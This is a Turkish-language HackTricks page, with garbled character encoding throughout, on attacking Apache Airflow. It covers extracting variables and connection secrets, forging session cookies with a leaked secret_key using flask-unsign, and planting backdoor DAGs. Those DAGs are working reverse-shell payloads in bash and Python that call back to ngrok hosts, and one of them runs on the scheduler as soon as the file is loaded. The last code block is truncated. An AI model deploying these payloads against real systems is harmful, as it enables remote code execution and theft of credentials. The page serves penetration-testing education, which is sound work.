# Apache Airflow GÃ¼venliÄŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

[**Apache Airflow**](https://airflow.apache.org), **veri boru hatlarÄ±nÄ± veya iÅŸ akÄ±ÅŸlarÄ±nÄ± dÃ¼zenlemek ve zamanlamak** iÃ§in bir platform olarak hizmet verir. Veri boru hatlarÄ± baÄŸlamÄ±nda "orkestrasyon" terimi, Ã§eÅŸitli kaynaklardan gelen karmaÅŸÄ±k veri iÅŸ akÄ±ÅŸlarÄ±nÄ±n dÃ¼zenlenmesi, koordinasyonu ve yÃ¶netimi sÃ¼recini ifade eder. Bu orkestrasyon edilen veri boru hatlarÄ±nÄ±n temel amacÄ±, iÅŸlenmiÅŸ ve tÃ¼ketilebilir veri kÃ¼melerini sunmaktÄ±r. Bu veri kÃ¼meleri, iÅŸ zekasÄ± araÃ§larÄ±, veri bilimi ve makine Ã¶ÄŸrenme modelleri de dahil olmak Ã¼zere birÃ§ok uygulama tarafÄ±ndan yaygÄ±n olarak kullanÄ±lmaktadÄ±r ve bÃ¼yÃ¼k veri uygulamalarÄ±nÄ±n iÅŸleyiÅŸine temel oluÅŸturur.

Temel olarak, Apache Airflow, bir ÅŸey olduÄŸunda (olay, cron) kodun yÃ¼rÃ¼tÃ¼lmesini **zamanlamak iÃ§in size izin verecektir**.

## Yerel Laboratuvar

### Docker-Compose

Tam bir Apache Airflow docker ortamÄ±nÄ± baÅŸlatmak iÃ§in **https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml** adresindeki **docker-compose yapÄ±landÄ±rma dosyasÄ±nÄ±** kullanabilirsiniz. (MacOS'ta iseniz, docker VM'ye en az 6GB RAM verdiÄŸinizden emin olun).

### Minikube

Apache Airflow'Ä± Ã§alÄ±ÅŸtÄ±rmanÄ±n kolay bir yolu, **minikube ile** Ã§alÄ±ÅŸtÄ±rmaktÄ±r:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow YapÄ±landÄ±rmasÄ±

Airflow, yapÄ±landÄ±rmasÄ±nda **hassas bilgileri** saklayabilir veya zayÄ±f yapÄ±landÄ±rmalar bulunabilir:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow'u saldÄ±rmadan Ã¶nce **izinlerin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±** anlamanÄ±z gerekmektedir:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## SaldÄ±rÄ±lar

### Web Konsolu SorgulamasÄ±

EÄŸer **web konsoluna eriÅŸiminiz varsa**, aÅŸaÄŸÄ±daki bilgilere bazÄ± veya tÃ¼mÃ¼ne eriÅŸebilirsiniz:

* **DeÄŸiÅŸkenler** (Ã–zel hassas bilgiler burada saklanabilir)
* **BaÄŸlantÄ±lar** (Ã–zel hassas bilgiler burada saklanabilir)
* `http://<airflow>/connection/list/` adresinden eriÅŸebilirsiniz
* [**YapÄ±landÄ±rma**](./#airflow-configuration) (Gizli anahtar (**`secret_key`**) ve ÅŸifreler gibi hassas bilgiler burada saklanabilir)
* KullanÄ±cÄ±lar ve rollerin listesi
* Her bir DAG'Ä±n **kodu** (ilginÃ§ bilgiler iÃ§erebilir)

### DeÄŸiÅŸken DeÄŸerlerini Almak

DeÄŸiÅŸkenler, Airflow'da saklanabilir, bÃ¶ylece **DAG'lar** deÄŸerlerine **eriÅŸebilir**. DiÄŸer platformlarÄ±n sÄ±rlarÄ±na benzer. Yeterli izinlere sahipseniz, bunlara GUI'de `http://<airflow>/variable/list/` adresinden eriÅŸebilirsiniz.\
Airflow, varsayÄ±lan olarak deÄŸiÅŸkenin deÄŸerini GUI'de gÃ¶sterecektir, ancak [**bu**](https://marclamberti.com/blog/variables-with-apache-airflow/) kaynaÄŸa gÃ¶re, GUI'de **yÄ±ldÄ±zlar** olarak gÃ¶rÃ¼necek **deÄŸerin** **listesini** ayarlamak mÃ¼mkÃ¼ndÃ¼r.

![](<../../.gitbook/assets/image (79).png>)

Ancak, bu **deÄŸerler** hala **CLI** (DB eriÅŸimi gerektirir), **rastgele DAG** yÃ¼rÃ¼tme, **API** ile deÄŸiÅŸkenler uÃ§ noktasÄ±na eriÅŸme (API'nin etkinleÅŸtirilmesi gerekmektedir) ve **GUI** kendisi aracÄ±lÄ±ÄŸÄ±yla **alÄ±nabilir**.\
GUI'den bu deÄŸerlere eriÅŸmek iÃ§in sadece eriÅŸmek istediÄŸiniz deÄŸiÅŸkenleri **seÃ§in** ve **Eylemler -> DÄ±ÅŸa Aktar** Ã¼zerine tÄ±klayÄ±n.\
BaÅŸka bir yol, **gizli deÄŸeri** elde etmek iÃ§in **arama filtrelemesi** kullanarak **brute force** yapmaktÄ±r:

![](<../../.gitbook/assets/image (30).png>)

### Yetki YÃ¼kseltme

EÄŸer **`expose_config`** yapÄ±landÄ±rmasÄ± **True** olarak ayarlanmÄ±ÅŸsa, **KullanÄ±cÄ±** rolÃ¼nden ve **yukarÄ±sÄ±ndan** olan herkes **web Ã¼zerinden yapÄ±landÄ±rmayÄ± okuyabilir**. Bu yapÄ±landÄ±rmada **`secret_key`** gÃ¶rÃ¼nÃ¼r, bu da bu geÃ§erli anahtara sahip herhangi bir kullanÄ±cÄ±nÄ±n **kendi imzalÄ± Ã§erezini oluÅŸturarak baÅŸka bir kullanÄ±cÄ± hesabÄ±nÄ± taklit edebileceÄŸi** anlamÄ±na gelir.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Arka KapÄ±sÄ± (Airflow worker'da RCE)

EÄŸer **DAG'larÄ±n kaydedildiÄŸi yere yazma eriÅŸiminiz varsa**, sadece bir tane **oluÅŸturabilirsiniz** ve size bir **ters kabuk** gÃ¶nderecektir.\
Bu ters kabuk, bir **airflow worker konteyneri** iÃ§inde Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Arka KapÄ±sÄ± (Airflow zamanlayÄ±cÄ±sÄ±nda RCE)

EÄŸer bir ÅŸeyi **kodun kÃ¶kÃ¼nde Ã§alÄ±ÅŸacak ÅŸekilde ayarlarsanÄ±z**, bu yazÄ± yazÄ±ldÄ±ÄŸÄ± sÄ±rada, bunun DAG klasÃ¶rÃ¼ne yerleÅŸtirildikten birkaÃ§ saniye sonra **zamanlayÄ±cÄ± tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG OluÅŸturma

EÄŸer DAG kÃ¼mesi iÃ§indeki bir makineyi **ele geÃ§irebilirseniz**, `dags/` klasÃ¶rÃ¼nde yeni **DAG betikleri** oluÅŸturabilir ve bu betikler DAG kÃ¼mesindeki diÄŸer makinelerde de **replike edilecektir**.

### DAG Kod Enjeksiyonu

GUI Ã¼zerinden bir DAG Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda, ona **argÃ¼manlar geÃ§irebilirsiniz**.\
Bu nedenle, DAG dÃ¼zgÃ¼n bir ÅŸekilde kodlanmamÄ±ÅŸsa **Komut Enjeksiyonuna** aÃ§Ä±k olabilir.\
Bu CVE'de olduÄŸu gibi: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAG'larda **komut enjeksiyonlarÄ±nÄ± aramaya baÅŸlamak iÃ§in bilmeniz gereken tek ÅŸey**, **parametrelerin** **kodla eriÅŸildiÄŸi** kodun **`dag_run.conf.get("param_name")`** olduÄŸudur.

AyrÄ±ca, aynÄ± zafiyet **deÄŸiÅŸkenlerle** de oluÅŸabilir (not edin ki yeterli yetkilere sahipseniz GUI Ã¼zerindeki deÄŸiÅŸkenlerin **deÄŸerini kontrol edebilirsiniz**). DeÄŸiÅŸkenlere **ÅŸu ÅŸekilde eriÅŸilir**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
EÄŸer Ã¶rneÄŸin bir bash komutu iÃ§inde kullanÄ±lÄ±yorlarsa, komut enjeksiyonu gerÃ§ekleÅŸtirebilirsiniz.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
